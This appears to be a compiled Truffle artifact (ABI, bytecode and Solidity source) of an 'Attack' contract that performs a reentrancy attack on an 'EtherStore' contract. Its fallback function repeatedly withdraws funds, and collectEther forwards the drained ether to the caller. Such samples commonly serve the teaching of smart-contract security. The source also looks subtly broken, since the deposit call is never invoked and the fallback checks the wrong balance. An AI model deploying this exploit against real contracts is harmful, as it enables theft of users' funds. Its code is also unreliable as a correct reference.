{
  "contractName": "Attack",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_etherStoreAddress",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attackEtherStore",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "collectEther",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405160208061039c83398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610319806100836000396000f300608060405260043610610057576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806379b9b93714610131578063acd2e6e51461013b578063ff11e1db14610192575b670de0b6b3a76400003073ffffffffffffffffffffffffffffffffffffffff1631111561012f576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561011657600080fd5b505af115801561012a573d6000803e3d6000fd5b505050505b005b6101396101a9565b005b34801561014757600080fd5b50610150610268565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561019e57600080fd5b506101a761028d565b005b6000809054906101000a9050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561024e57600080fd5b505af1158015610262573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102ea573d6000803e3d6000fd5b505600a165627a7a72305820379db6d3525e06f416f260f7ecd9d01508c559c965412d87d842c5c7cc41fcf10029",
  "source": "pragma solidity ^0.4.22;\nimport \"./EtherStore.sol\";\ncontract Attack {\n    \nEtherStore public etherStore;\n    constructor(address _etherStoreAddress) {\n        etherStore = EtherStore(_etherStoreAddress);\n    }\n\n    function attackEtherStore() public payable {\n        etherStore.depositFunds.value(1 ether);\n        etherStore.withdrawFunds(1 ether);\n    }\n    \n    function collectEther() public {\n        msg.sender.transfer(address(this).balance);\n    }\n\n\n    function () payable {\n        if (address(this).balance > 1 ether) {\n        etherStore.withdrawFunds(1 ether);\n        }\n    }\n    \n}\n",
  "sourcePath": "/home/khc/Desktop/blockchain/EtherStore/contracts/Attack.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "2.0.2",
  "updatedAt": "2021-04-06T13:59:40.396Z"
}